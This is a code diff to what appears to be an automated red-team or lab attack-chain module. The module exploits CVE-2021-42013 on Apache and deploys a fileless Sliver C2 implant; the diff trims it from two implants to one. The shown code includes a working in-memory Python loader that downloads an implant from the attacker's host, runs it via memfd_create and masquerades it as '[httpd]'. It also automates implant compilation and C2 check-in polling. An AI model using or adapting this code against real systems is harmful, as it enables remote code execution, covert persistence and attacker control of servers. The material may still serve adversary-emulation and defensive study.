@@ -18,16 +18,15 @@ from chainlog import log
 #   T1036.005 – Masquerading: Match Legitimate Name (`[httpd]` argv[0])
 #   T1071.001 – Application Layer Protocol: Web Protocols  (Sliver HTTP C2)
 # -----------------------------------------------------------------------------
-# Drops two in-memory Sliver implants on the apache target via a Base64-
+# Drops a single in-memory Sliver implant on the apache target via a Base64-
 # encoded Python loader delivered through CVE-2021-42013 path-traversal RCE:
-#   * Session implant — real-time, used for interactive enumeration / upload
-#   * Beacon implant  — 5-second async check-in, used for long-running tasks
-# Both implants are anonymous file descriptors (memfd_create) and process-
-# masquerade as `[httpd]` under www-data. No on-disk artefact on the target.
+#   * Session implant — real-time, used for interactive execution
+# The implant is an anonymous file descriptor (memfd_create) and process-
+# masquerades as `[httpd]` under www-data. No on-disk artefact on the target.
 #
 # Chain-orchestrator entrypoint: ``run(target_ip, kali_ip) -> dict`` which
-# returns ``{"sliver_session": <id>, "sliver_beacon": <id>}`` for downstream
-# advanced steps (advanced_webserver_post_exploit_enum / _privesc) to drive.
+# returns ``{"sliver_session": <id>}`` for downstream advanced steps
+# (advanced_webserver_post_exploit_enum / _privesc) to drive.
 # =============================================================================
 
 
@@ -200,11 +199,11 @@ def ensure_sliver_listener():
         "(ss -ltn | grep 31337) and inspect /tmp/sliver-daemon.log."
     )
 
-def ensure_beacon_compiled(kali_ip):
-    """Verify that both target Sliver implants (session and beacon) are compiled at /tmp.
+def ensure_session_compiled(kali_ip):
+    """Verify that the target Sliver session implant is compiled at /tmp.
     If missing, triggers a background garble compilation via sliver-client.
     """
-    # 1. Ensure real-time Session implant is compiled
+    # Ensure real-time Session implant is compiled
     if not os.path.exists("/tmp/session_implant"):
         log(f"[*] C2 Session implant not found. Compiling targeting {kali_ip}:8080...")
         rc_content = f"generate --http {kali_ip}:8080 --os linux --arch amd64 --save /tmp/session_implant\nexit\n"
@@ -225,28 +224,6 @@ def ensure_beacon_compiled(kali_ip):
             sys.exit(1)
     else:
         log("[+] C2 Session implant exists at /tmp/session_implant.")
-
-    # 2. Ensure passive Beacon implant is compiled (check-in interval set to 5 seconds for testing)
-    if not os.path.exists("/tmp/beacon_implant"):
-        log(f"[*] C2 Beacon implant not found. Compiling targeting {kali_ip}:8080 with 5s sleep...")
-        rc_content = f"generate beacon --http {kali_ip}:8080 --seconds 5 --os linux --arch amd64 --save /tmp/beacon_implant\nexit\n"
-        rc_path = "/tmp/compile_beacon.rc"
-        with open(rc_path, "w") as f:
-            f.write(rc_content)
-
-        cmd = ["sliver-client", "--rc", rc_path]
-        try:
-            res = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-            if "saved to /tmp/beacon_implant" in res.stdout or os.path.exists("/tmp/beacon_implant"):
-                log("[+] C2 Beacon implant successfully compiled.")
-            else:
-                log(f"[-] Error compiling Beacon: {res.stdout}")
-                sys.exit(1)
-        except subprocess.TimeoutExpired:
-            log("[-] Timeout: Beacon compilation took longer than 300 seconds.")
-            sys.exit(1)
-    else:
-        log("[+] C2 Beacon implant exists at /tmp/beacon_implant.")
 
 def ensure_file_server():
     """Verify that the Python HTTP web server on port 8000 is active.
@@ -269,14 +246,14 @@ def ensure_file_server():
 def build_payload(kali_ip, file_port):
     """Generate the Base64-encoded Python loader payload.
     This loader runs entirely in-memory using the memfd_create system call.
-    It downloads and runs BOTH the session implant and the beacon implant in parallel,
-    allowing comparative analysis. Both processes masquerade as '[httpd]' under www-data.
+    It downloads and runs the session implant. The process masquerades as
+    '[httpd]' under www-data.
     """
     loader_code = f"""import urllib.request, ctypes, os, sys
 try:
     libc = ctypes.CDLL(None)
 
-    # 1. Download and execute C2 Session (real-time)
+    # Download and execute C2 Session (real-time)
     url_sess = "http://{kali_ip}:{file_port}/session_implant"
     with urllib.request.urlopen(url_sess) as r:
         data_sess = r.read()
@@ -285,17 +262,6 @@ try:
         os.write(fd_sess, data_sess)
         if os.fork() == 0:
             os.execve(f"/proc/self/fd/{{fd_sess}}", ["[httpd]"], os.environ)
-            sys.exit(0)
-
-    # 2. Download and execute C2 Beacon (5s interval)
-    url_beac = "http://{kali_ip}:{file_port}/beacon_implant"
-    with urllib.request.urlopen(url_beac) as r:
-        data_beac = r.read()
-    fd_beac = libc.syscall(319, b'httpd_cache', 1)
-    if fd_beac >= 0:
-        os.write(fd_beac, data_beac)
-        if os.fork() == 0:
-            os.execve(f"/proc/self/fd/{{fd_beac}}", ["[httpd]"], os.environ)
             sys.exit(0)
 
     # CGI parent exits immediately to prevent connection hangs
@@ -349,13 +315,13 @@ def fire_exploit(target_url, kali_ip, file_port=8000):
             s.close()
 
 def check_sliver_session():
-    """Run sliver-client to query both sessions and beacons."""
-    cmd = ["sh", "-c", "echo 'sessions' > /tmp/list_sess.rc && echo 'beacons' >> /tmp/list_sess.rc && echo 'exit' >> /tmp/list_sess.rc && sliver-client --rc /tmp/list_sess.rc"]
+    """Run sliver-client to query sessions."""
+    cmd = ["sh", "-c", "echo 'sessions' > /tmp/list_sess.rc && echo 'exit' >> /tmp/list_sess.rc && sliver-client --rc /tmp/list_sess.rc"]
     try:
         res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
         return res.stdout
     except Exception as e:
-        log(f"[-] Error checking Sliver sessions/beacons: {e}")
+        log(f"[-] Error checking Sliver sessions: {e}")
         return ""
 
 def deploy_fileless_c2(target_ip, kali_ip, file_port=8000):
@@ -367,30 +333,30 @@ def deploy_fileless_c2(target_ip, kali_ip, file_port=8000):
     ensure_sliver_daemon()
     ensure_sliver_client_configured()
     ensure_sliver_listener()
-    ensure_beacon_compiled(kali_ip)
+    ensure_session_compiled(kali_ip)
     ensure_file_server()
     log("[+] All C2 prerequisites are satisfied.")
 
     # 1. Fire the exploit
     fire_exploit(target_url, kali_ip, file_port)
 
-    # 2. Wait and poll for the sessions/beacons in Sliver
+    # 2. Wait and poll for the session in Sliver
     log("[*] Waiting for Sliver C2 check-ins (polling every 5s)...")
     for attempt in range(1, 15):
         time.sleep(5)
         output = check_sliver_session()
-        # Look for any active connections/beacons in Sliver's output
+        # Look for any active connections in Sliver's output
         if "linux" in output.lower() or "active" in output.lower():
             lines = output.splitlines()
             matches = [l for l in lines if "http" in l.lower() or "linux" in l.lower()]
             if matches:
-                log("[+] Success! Active C2 connection(s) detected in Sliver:")
+                log("[+] Success! Active C2 connection detected in Sliver:")
                 for m in matches:
                     log(f"    {m}")
                 return True
         log(f"[*] Attempt {attempt}/14: No C2 check-ins yet...")
 
-    log("[-] Timeout: Sliver connections failed to establish.")
+    log("[-] Timeout: Sliver connection failed to establish.")
     return False
 
 
@@ -505,30 +471,25 @@ def sliver_upload(implant_id: str, local_path: str, remote_path: str,
 def run(target_ip: str, kali_ip: str = "10.10.0.2", file_port: int = 8000) -> dict:
     """Chain-orchestrator entrypoint.
 
-    Establishes the fileless Sliver Session + Beacon on the apache target and
-    returns their IDs so downstream advanced steps (post_exploit_enum,
-    privesc) can drive them via :func:`sliver_exec`.
+    Establishes the fileless Sliver Session on the apache target and
+    returns its ID so downstream advanced steps (post_exploit_enum,
+    privesc) can drive it via :func:`sliver_exec`.
 
     Raises:
-        RuntimeError: if the implants never call back or never appear in the
-                      sliver-client sessions/beacons tables.
+        RuntimeError: if the implant never calls back or never appears in the
+                      sliver-client sessions table.
     """
     success = deploy_fileless_c2(target_ip, kali_ip, file_port=file_port)
     if not success:
-        raise RuntimeError("advanced exploit returned no Sliver session/beacon")
+        raise RuntimeError("advanced exploit returned no Sliver session")
 
     sess_id = _parse_last_active_id(_list_sliver("sessions"))
-    beac_id = _parse_last_active_id(_list_sliver("beacons"))
     if not sess_id:
         raise RuntimeError("advanced exploit: session implant did not appear in Sliver")
     log(f"[+] Sliver Session ID: {sess_id}")
-    if beac_id:
-        log(f"[+] Sliver Beacon ID:  {beac_id}")
-    else:
-        log("[!] Sliver Beacon not visible yet -- downstream steps may need a brief wait")
     return {
         "sliver_session": sess_id,
-        "sliver_beacon":  beac_id,
+        "sliver_beacon":  None,
     }
 
 
